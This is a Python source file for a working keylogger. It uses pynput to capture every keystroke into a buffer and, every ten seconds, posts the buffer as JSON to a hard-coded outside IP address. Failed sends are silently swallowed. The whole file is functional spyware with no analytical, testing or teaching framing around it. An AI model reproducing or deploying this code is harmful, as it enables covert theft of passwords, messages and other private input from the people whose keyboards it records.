import json
import threading
import requests
from pynput import keyboard


class KeyLogger:
    def __init__(self, callback=None, host="109.74.200.23", port=8080, interval=10):
        self.callback = callback
        self.host = host
        self.port = port
        self.interval = interval
        self.text = ""
        self.stop_event = threading.Event()
        self.timer = None
        self.listener = keyboard.Listener(on_press=self._on_press)

    def _send_post_req(self):
        if self.stop_event.is_set():
            return

        payload = json.dumps({"keyboardData": self.text})
        try:
            requests.post(
                f"http://{self.host}:{self.port}",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=5,
            )
        except Exception:
            pass

        self.timer = threading.Timer(self.interval, self._send_post_req)
        self.timer.daemon = True
        self.timer.start()

    def _send_callback(self, item):
        if self.callback:
            try:
                self.callback(item)
            except Exception:
                pass

    def _on_press(self, key):
        if key == keyboard.Key.enter:
            self.text += "\n"
            self._send_callback("\n")
        elif key == keyboard.Key.tab:
            self.text += "\t"
            self._send_callback("\t")
        elif key == keyboard.Key.space:
            self.text += " "
            self._send_callback(" ")
        elif key in {
            keyboard.Key.shift,
            keyboard.Key.shift_l,
            keyboard.Key.shift_r,
            keyboard.Key.ctrl_l,
            keyboard.Key.ctrl_r,
            keyboard.Key.alt_l,
            keyboard.Key.alt_r,
            keyboard.Key.cmd,
            keyboard.Key.cmd_l,
            keyboard.Key.cmd_r,
            keyboard.Key.caps_lock,
        }:
            return
        elif key == keyboard.Key.backspace:
            if self.text:
                self.text = self.text[:-1]
                self._send_callback("\b")
        elif key == keyboard.Key.esc:
            return False
        else:
            char = str(key).strip("'")
            self.text += char
            self._send_callback(char)

    def start(self):
        self.stop_event.clear()
        if not self.listener.running:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
        if self.timer is None:
            self._send_post_req()

    def stop(self):
        self.stop_event.set()
        if self.timer:
            self.timer.cancel()
            self.timer = None
        if self.listener.running:
            self.listener.stop()
